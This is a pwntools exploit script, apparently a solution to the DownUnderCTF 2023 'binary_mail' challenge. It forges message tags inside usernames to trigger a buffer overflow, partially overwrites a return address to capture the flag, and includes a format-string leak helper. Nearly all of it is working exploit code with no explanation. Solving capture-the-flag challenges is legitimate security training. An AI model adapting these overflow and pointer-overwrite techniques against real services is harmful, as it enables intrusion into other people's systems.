from pwn import *
fn = "./binary_mail"
# fn = "./mod"
context.log_level = "debug"
elf = ELF(fn, checksec=False)
context.binary = elf
libc = elf.libc
real = True
if real:
    # p = process(fn)
    p = remote("2023.ductf.dev", 30011)
else:
    p = gdb.debug(fn, """
    b *(view_mail+747)
    c
    """)
sla = lambda x, y: p.sendlineafter(x, y)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
num_to_bytes = lambda x: str(x).encode("ascii")
def gen_fmt(start, end):
    buf = ""
    for x in range(start, end):
        buf += f"%{x}$p."
    return buf[:-1]

# ======================================
# Exploit goes here

import time
time.sleep(1)

tags = [
    "TAG_RES_MSG",
    "TAG_RES_ERROR",
    "TAG_INPUT_REQ",
    "TAG_INPUT_ANS",
    "TAG_COMMAND",
    "TAG_STR_PASSWORD",
    "TAG_STR_FROM",
    "TAG_STR_MESSAGE"
]
USERPASS_LEN = 128
MESSAGE_LEN = 1024

def craft_taglen(tag: str, len: int) -> bytes:
    return p32(tags.index(tag)) + p64(len)

def send_taglen(tag: str, len: int):
    p.send(p32(tags.index(tag)) + p64(len))

def send_taglen_after(after: bytes, tag: str, len: int):
    p.sendafter(after, p32(tags.index(tag)) + p64(len))

def register(username_length: int, username: bytes, password_length: int, password: bytes):
    # assert username_length < USERPASS_LEN and len(username) == username_length
    # assert password_length < USERPASS_LEN and len(password) == password_length

    send_taglen("TAG_COMMAND", 8)  # for main
    p.send(b"register")
    send_taglen_after("username", "TAG_INPUT_ANS", username_length)
    p.send(username)
    msg = p.recvuntil([b"password", b"user already exists"])
    if b"user already exists" in msg:
        log.info("[-] User already exists")
        return

    send_taglen("TAG_INPUT_ANS", password_length)
    p.send(password)
    log.info(f"[+] Successfully created user {username}")

import re
TIMEOUT = 2

def handle_auth(username_length: int, username: bytes, password_length: int, password: bytes) -> bool:
    # assert username_length < USERPASS_LEN and len(username) == username_length
    # assert password_length < USERPASS_LEN and len(password) == password_length

    send_taglen_after("username", "TAG_INPUT_ANS", username_length)
    p.send(username)
    msg = p.recvuntil([b"password", b"user does not exist"])
    if b"user does not exists" in msg:
        log.info("[-] User does not exist")
        return False

    send_taglen("TAG_INPUT_ANS", password_length)
    p.send(password)
    msg = p.recvuntil([b"corrupted", b"incorrect"], timeout=TIMEOUT)
    if len(msg) != 0:
        if b"incorrect" in msg:
            log.info("[-] incorrect password")
            return False

        msg = p.recvline()
        leaks = re.findall(r'\d+', msg)
        log.info(f"[+] corrupted leaks: {leaks}")
        return False

    return True

def view_mail(username_length: int, username: bytes, password_length: int, password: bytes):
    send_taglen("TAG_COMMAND", 9)  # for main
    p.send(b"view_mail")

    if not handle_auth(username_length, username, password_length, password):
        return

    msg = p.recvuntil([b"no mail", b"mail invalid from", b"mail invalid message"], timeout=TIMEOUT)
    if len(msg) != 0:
        log.info(f"[-] {msg}")
        return
    
    log.info("Your mail is: ...")
    
def send_mail(username_length: int, username: bytes, password_length: int, password: bytes, recipient_length: int, recipient: bytes, message_length: int, message: bytes):

    # assert recipient_length < USERPASS_LEN and len(recipient) == recipient_length
    # assert message_length < MESSAGE_LEN and len(message) == message_length

    send_taglen("TAG_COMMAND", 9)  # for main
    p.send(b"send_mail")

    if not handle_auth(username_length, username, password_length, password):
        return
    
    send_taglen_after(b"recipient", "TAG_INPUT_ANS", recipient_length)
    p.send(recipient)
    send_taglen_after(b"message", "TAG_INPUT_ANS", message_length)
    p.send(message)
    p.recvuntil(b"message sent")

def forge_mail(recipient: bytes, payload: bytes):
    password = "dogfood1"
    ulong_max = 0xffffffffffffffff
    sender = recipient + craft_taglen("TAG_STR_MESSAGE", ulong_max)
    register(len(recipient), recipient, 8, password)
    register(len(sender), sender, 8, password)
    send_mail(len(sender), sender, 8, password, len(recipient), recipient, 1023, b"A"*1023)
    send_mail(len(sender), sender, 8, password, len(recipient), recipient, len(payload), payload)
    view_mail(len(recipient), recipient, 8, password)
    msg = p.recvuntil(b"ductf", timeout=5)
    if len(msg) != 0:
        log.info("WINNER!")
        with open("flagged.txt", "w") as f:
            f.write(p.recvline())

forge_mail(b"bob", b"B"*(1023-908) + b"\x6b\x12")

p.interactive()